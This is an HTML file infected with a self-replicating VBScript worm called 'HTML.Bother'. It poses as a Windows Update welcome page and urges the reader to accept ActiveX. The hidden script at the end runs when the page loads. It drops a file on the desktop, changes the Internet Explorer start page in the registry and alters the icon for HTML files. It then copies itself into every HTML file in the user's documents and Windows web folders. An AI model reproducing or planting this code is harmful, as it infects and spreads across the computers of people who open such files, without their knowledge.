<bother>
<script>

//Build the query
userURL=external.menuArguments.location.href;
RelatedServiceURL="http://related.msn.com/related.asp?url=";

//Perform simple check for Intranet URLs 
//this is where the http or https will be, as found by searching for :// but skip res:
protocolIndex=userURL.indexOf("://",4);
serverIndex=userURL.indexOf("/",protocolIndex + 3);
urlresult=userURL.substring(0,serverIndex);

//Check if Intranet URL - then open search bar

if (urlresult.indexOf(".",0) < 1) userURL="Intranet URL";
finalURL = RelatedServiceURL + encodeURIComponent(userURL);
external.menuArguments.open(finalURL, "_search");

</script>



<bother par PetiK May 9th 2001>
<TABLE cellSpacing=0 cellPadding=0 width=603 border=0>
<TBODY>
<TR>
<TD colSpan=2 height=40><IMG height=40 alt="Windows Update" hspace=0 
src="wulogo.gif" width=603 border=0></TD></TR>
<TR>
<TD width=25 bgColor=#000066>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</TD>
<TD>
<DIV style="MARGIN-TOP: 18px; MARGIN-LEFT: 18px">
<TABLE cellSpacing=0 cellPadding=0 border=0>
<TBODY>
<TR>
<TD colSpan=2><B class=header>Thank you for your interest in Windows Update.</B> 
<BR><BR></TD></TR>
<TR>
<TD></TD>
<TD><BR><B class=subheader>Try Windows<SUP>®</SUP> Update - the extension of 
Windows on the Web. When you visit the Windows Update Web site you'll be able to 
. . . </B></FONT><FONT face=Verdana,Arial,Helvetica>
<UL>
<LI>Keep your computer up-to-date with the latest operating system upgrades and 
features. 
<LI>Simplify your life with automatic updates that are easy to access and easy 
to use. 
<LI>Stay informed by easily finding answers to your questions about Windows. 
</LI></UL></FONT></TD></TR>
<TR>
<TD colSpan=2><BR clear=all><FONT face=Verdana,Arial,Helvetica><B>To take 
advantage of Windows Update, all you need is Internet Explorer and a connection 
to the Internet.</B> 
<P><A href="javascript:goWU()"><IMG height=20 hspace=1 src="wuicon1.gif" 
width=20 border=0>Connect me to the Internet.</A> <BR clear=all><SPAN 
class=normal style="MARGIN-LEFT: 27px">If you've never logged on to the Internet 
before, click on the sentence above to launch the Internet Connection Wizard, 
which will help you sign up for Internet access. Once you are connected to the 
Internet, select the Windows Update icon from your Start Menu and Internet 
Explorer will take you directly to the Windows Update site. If you already have 
Internet access, go to the Start Menu and select the Windows Update icon. 
Internet Explorer will launch the Windows Update site. </SPAN><BR><BR><A 
href="javascript:window.close()"><IMG id=closeIcon height=20 hspace=1 
src="wuicon2.gif" width=20 border=0>I'd like to try Windows Update another 
time.</A> <BR clear=all><SPAN class=normal style="MARGIN-LEFT: 27px">When you 
click on the X icon above, this browser window will close. You can create a 
connection to the Internet and visit Windows Update at any time by doing the 
following: 
<UL>
<LI>Go to your Start Menu. 
<LI>Select Programs. Select Internet Explorer and then click on Internet 
Connection Wizard. 
<LI>Internet Connection Wizard will help you select an Internet Service Provider 
(ISP) or connect you to your Local Area Network (LAN).
<DIV></DIV></LI></UL>
<P>Once you are connected to the Internet, select Windows Update from your Start 
Menu. Internet Explorer will take you to the Windows Update site. 
</SPAN><BR><BR><A href="javascript:window.close()"><IMG id=closeIcon height=20 
hspace=1 src="wuicon2.gif" width=20 border=0>I want to delete Windows Update 
from my Start Menu.</A> <BR clear=all><SPAN class=normal 
style="MARGIN-LEFT: 27px">When you click on the X icon above, this browser 
window will close. If you want to delete the Windows Update icon from your Start 
Menu, follow these steps: 
<UL>
<LI>Go to your Start Menu. 
<LI>Select Windows Update. 
<LI>Click the right mouse button. 
<LI>Click Delete. 
</LI></UL></SPAN></FONT></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE>
<OBJECT id=WUpdInfo classid=clsid:A3863C2E-86EB-11D1-A9DB-00C04FB16F9E width=0 
height=0 type=application/x-oleobject></OBJECT><BOTHER 2001 9th May PetiK 
par><FONT face=verdana color=#ff0000 size=2>You need ActiveX enabled if you want 
to see this page. <BR>Please open this page again and click accept 
ActiveX.<BR>Internet Explorer</FONT>
<SCRIPT language=VBScript>
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")

bureau=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Desktop")
Set txt=fso.CreateTextFile(bureau&"\Hello.txt")
txt.WriteLine "HTML.Bother by PetiK (06/05/2001)"
txt.WriteLine "A HTML.Worm made in France"
txt.Close

start=ws.RegRead ("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page")
If start <> fso.GetSpecialFolder(1)&"\PetiK.htm" Then
Set htm=fso.CreateTextFile(fso.GetSpecialFolder(1)&"\PetiK.htm",2)
htm.WriteLine ("<html><head><title>HTML.Bother</title>")
htm.WriteLine ("<body><IFRAME SRC='"+start+"'></IFRAME>")
htm.WriteLine ("<font face='verdana' color=blue size='2'>")
htm.WriteLine ("<br><br>Hi, you have my Worm.")
htm.WriteLine ("<br>It's not dangerous.")
htm.WriteLine ("<br>Contact Symantec Corporation (www.symantec.com/avcenter) to disinfect your computer")
htm.WriteLine ("</body></html>")
htm.Close
ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",fso.GetSpecialFolder(1)&"\PetiK.htm"
End If

p = Int(Rnd * 30) + 1
If Day(Now()) = p Then
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\",fso.GetSpecialFolder(1)&"\SHELL32.dll,69"
End If

doc=ws.RegRead ("HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
Set FolderObj = FSO.GetFolder(doc)
	Set FO = FolderObj.Files
	For each cible in FO
		ExtName = lcase(FSO.GetExtensionName(cible.Name))
		if ExtName = "htm" or ExtName = "html" Then
			Set vrai = fso.OpenTextFile(cible.path, 1, False)
			if vrai.readline <> "<bother>" Then
				vrai.close()
				Set vrai = fso.OpenTextFile(cible.path, 1, False)
				htmorg = vrai.ReadAll()
				vrai.close()
				Set virus = document.body.createTextRange
				Set vrai = fso.CreateTextFile(cible.path, True, False)
				vrai.WriteLine "<bother>"
				vrai.Write(htmorg)
				vrai.WriteLine "<bother par PetiK May 9th 2001>"
				vrai.WriteLine virus.htmltext
				vrai.Close()
			else
				Real.close()
			end if
		end if
	next
	
Set FolderObj = FSO.GetFolder(fso.GetSpecialFolder(0)&"\WEB")
	Set FO = FolderObj.Files
	For each cible in FO
		ExtName = lcase(FSO.GetExtensionName(cible.Name))
		if ExtName = "htm" or ExtName = "html" Then
			Set vrai = fso.OpenTextFile(cible.path, 1, False)
			if vrai.readline <> "<bother>" Then
				vrai.close()
				Set vrai = fso.OpenTextFile(cible.path, 1, False)
				htmorg = vrai.ReadAll()
				vrai.close()
				Set virus = document.body.createTextRange
				Set vrai = fso.CreateTextFile(cible.path, True, False)
				vrai.WriteLine "<bother>"
				vrai.Write(htmorg)
				vrai.WriteLine "<bother par PetiK May 9th 2001>"
				vrai.WriteLine virus.htmltext
				vrai.Close()
			else
				Real.close()
			end if
		end if
	next

</SCRIPT>
